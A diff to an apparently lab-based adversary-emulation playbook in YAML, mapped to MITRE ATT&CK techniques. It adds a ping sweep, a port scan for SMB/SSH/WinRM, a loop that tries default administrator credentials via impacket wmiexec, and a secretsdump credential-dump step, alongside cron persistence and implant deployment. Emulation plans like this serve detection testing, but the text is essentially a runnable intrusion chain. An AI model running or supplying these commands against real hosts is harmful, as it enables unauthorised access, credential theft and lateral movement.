@@ -14,22 +14,8 @@ mitre_tactics:
   - execution
   - credential-access
 steps:
-  - id: honeypot_recon
-    name: Honeypot recon — confirm fake camera (T1046)
-    action:
-      type: command
-      command:
-        interpreter: bash
-        cmd: >
-          curl -s -o /dev/null -w "honeypot_status:%{http_code}" http://192.168.56.10:8080/ 2>/dev/null && echo "
-          camera_found:true" || echo "honeypot_status:0"
-    output_var: honeypot_status
-    timeout: 10s
-    on_fail: continue
   - id: linux_sysinfo
     name: Linux host discovery (T1082)
-    depends_on:
-      - honeypot_recon
     action:
       type: atomic
       atomic_ref:
@@ -50,10 +36,20 @@ steps:
     output_var: linux_network_out
     timeout: 30s
     on_fail: continue
+  - id: T1016_2_mrxv767j_2
+    name: T1016 — System Network Configuration Discovery
+    depends_on:
+      - linux_network
+    action:
+      type: atomic
+      atomic_ref:
+        id: T1016
+        test: 2
+    on_fail: continue
   - id: cron_persistence
     name: Cron persistence (T1053.003)
     depends_on:
-      - linux_sysinfo
+      - T1016_2_mrxv767j_2
     action:
       type: atomic
       atomic_ref:
@@ -72,59 +68,57 @@ steps:
         test: 0
     timeout: 30s
     on_fail: continue
-  - id: find_windows_host
-    name: Scan internal net for Windows SMB port 445
+  - id: ping_sweep
+    name: Parallel ping sweep
     depends_on:
-      - linux_network
+      - systemd_persistence
+    action:
+      type: command
+      command:
+        interpreter: bash
+        cmd: for i in {1..254}; do (ping -c1 -W1 172.16.1.$i | grep "bytes from" &); done; wait
+    output_var: alive_hosts
+    on_fail: continue
+  - id: reliable_scan
+    name: Scan SMB, SSH, WinRM (2s timeout)
+    depends_on:
+      - ping_sweep
     action:
       type: command
       command:
         interpreter: bash
         cmd: |
-          # Dynamic Windows host discovery — arp-scan + SMB port check
-          echo "[*] Scanning internal network for Windows hosts (port 445)..."
-          # Get local subnet:
-          SUBNET=$(ip route | grep -oP '172\.16\.[0-9]+\.0/[0-9]+' | head -1)
-          if [ -z "$SUBNET" ]; then
-            SUBNET="172.16.1.0/24"
-          fi
-          echo "[*] Target subnet: $SUBNET"
-          # Scan with nmap for SMB port 445:
-          FOUND=""
-          if command -v nmap &>/dev/null; then
-            FOUND=$(nmap -p 445 --open -T4 "$SUBNET" 2>/dev/null | grep "Nmap scan report" | grep -oP '[\d.]+' | while read ip; do
-              timeout 1 bash -c "echo > /dev/tcp/$ip/445" 2>/dev/null && echo "$ip" && break
-            done)
-          fi
-          # Fallback — arp-scan:
-          if [ -z "$FOUND" ] && command -v arp-scan &>/dev/null; then
-            FOUND=$(arp-scan "$SUBNET" 2>/dev/null | grep -oP '172\.16\.[0-9]+\.[0-9]+' | while read ip; do
-              timeout 1 bash -c "echo > /dev/tcp/$ip/445" 2>/dev/null && echo "$ip" && break
-            done)
-          fi
-          # Final fallback — tcp sweep:
-          if [ -z "$FOUND" ]; then
-            for i in $(seq 1 254); do
-              ip="172.16.1.$i"
-              timeout 0.5 bash -c "echo > /dev/tcp/$ip/445" 2>/dev/null && FOUND="$ip" && break
-            done
-          fi
-          if [ -n "$FOUND" ]; then
-            echo "WINDOWS_HOST_FOUND: $FOUND"
-          else
-            echo "NO_WINDOWS_HOST_FOUND"
-          fi
-    output_var: windows_host_out
-    output_extract:
-      - var: win_ip
-        regex: 'WINDOWS_HOST_FOUND: ([0-9.]+)'
-        group: 1
-    timeout: 15s
+          TARGET=172.16.1.20
+          for port in 22 445 5985 5986; do
+            if timeout 2 bash -c "echo >/dev/tcp/$TARGET/$port" 2>/dev/null; then
+              echo "OPEN:   $TARGET:$port"
+            else
+              echo "CLOSED: $TARGET:$port"
+            fi
+          done
+    output_var: service_status
+    on_fail: continue
+  - id: test_defaults
+    name: Test multiple default credentials
+    depends_on:
+      - reliable_scan
+    action:
+      type: command
+      command:
+        interpreter: bash
+        cmd: |
+          for cred in "vagrant:vagrant" "Administrator:vagrant" "Administrator:password" "Administrator:admin"; do
+            if python3 /usr/share/doc/python3-impacket/examples/wmiexec.py "$cred"@172.16.1.20 "hostname" 2>/dev/null | grep -qi "DESKTOP"; then
+              echo "VALID: $cred"
+              break
+            fi
+          done
+    output_var: valid_cred
     on_fail: continue
   - id: lateral_recon
     name: Lateral movement — wmiexec hostname (T1021)
     depends_on:
-      - find_windows_host
+      - test_defaults
     action:
       type: command
       command:
@@ -164,7 +158,7 @@ steps:
   - id: deploy_implant
     name: Deploy Windows implant via wmiexec (scheduled task trigger)
     depends_on:
-      - lateral_recon
+      - win_sysinfo
     action:
       type: command
       command:
@@ -187,25 +181,21 @@ steps:
   - id: sam_dump
     name: SAM registry dump via wmiexec (T1003.002)
     depends_on:
-      - lateral_recon
+      - deploy_implant
     action:
       type: command
       command:
         interpreter: bash
         cmd: |
           # Trigger SAMDump scheduled task (fast, <2s, non-blocking):
-          python3 /usr/share/doc/python3-impacket/examples/wmiexec.py \
-            'vagrant:vagrant@172.16.1.20' \
-            "schtasks /run /tn SAMDump" \
-            2>&1 | grep -v "^\[" | grep -v "^Impacket" | grep -v "^$" | head -3
-          echo "SAM_DUMP_TRIGGERED"
+          python3 /usr/share/doc/python3-impacket/examples/secretsdump.py 'vagrant:vagrant@172.16.1.20'
     output_var: sam_dump_out
     timeout: 120s
     on_fail: continue_no_err
   - id: find_dc_candidate
     name: Scan for AD/DC host — Kerberos(88) LDAP(389) SMB(445) (T1046)
     depends_on:
-      - deploy_implant
+      - sam_dump
     action:
       type: command
       command:
